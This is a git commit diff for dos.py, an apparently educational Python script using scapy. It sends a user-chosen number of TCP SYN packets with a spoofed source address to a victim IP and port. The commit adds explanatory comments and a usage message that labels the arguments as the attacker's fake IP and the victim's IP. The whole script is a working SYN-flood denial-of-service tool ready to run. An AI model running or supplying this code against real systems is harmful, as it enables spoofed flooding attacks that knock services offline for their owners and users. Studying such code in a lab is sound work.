f20e6d67b0dc59b9064aaa9670704e68d04088b6
Kaled Aljebur <kaledaljebur@gmail.com>
2024-10-15 23:24:06 +1000

    txt fix

--- dos.py
+++ dos.py
@@ -1,16 +1,31 @@
 import sys, socket
 from scapy.all import *
+errorMessage= """
+Not correct number of arguments, follow the below example:
+- sudo python ./dos.py 192.168.1.2 192.168.1.200 80 10
+    - Notice:
+        - sudo python ./dos.py is to run the file.
+        - 192.168.1.2 is the attacker or fake IP.
+        - 192.168.1.200 is victim IP.
+        - 10 number of attacking packets (small number for quick testing). 
+"""
 if len(sys.argv) != 5:
-	print ("Usage>>>: %s source_IP dest_IP dest_port how_many_packets" % sys.argv[0])
+	# This message will be printed if the command arguments are less than five
+	print (errorMessage)
+	# This will stop running the code
 	sys.exit(1)
-srcIP = sys.argv[1]
-destIP = sys.argv[2]
-destPort = int(sys.argv[3])
-count = int(sys.argv[4])
-for i in range(count):
-	IP_header = IP(src = srcIP, dst = destIP)
-	TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)
-	packet = IP_header / TCP_header
+# sys.argv[0] is the command itself ./dos.py, 
+attackerIP = sys.argv[1]
+victimServerIP = sys.argv[2]
+# Convert sys.argv[3] from string into integer value
+victimServerPort = int(sys.argv[3])
+# Convert sys.argv[4] from string into integer value
+numberOfPackets = int(sys.argv[4])
+# The loop will be up to sys.argv[4] which is number of attacking packets
+for i in range(numberOfPackets):
+	ipHeader = IP(src = attackerIP, dst = victimServerIP)
+	tcpHeader = TCP(flags = "S", sport = RandShort(), dport = victimServerPort)
+	packet = ipHeader / tcpHeader
 	try:
 		send(packet)
 	except Exception as e:
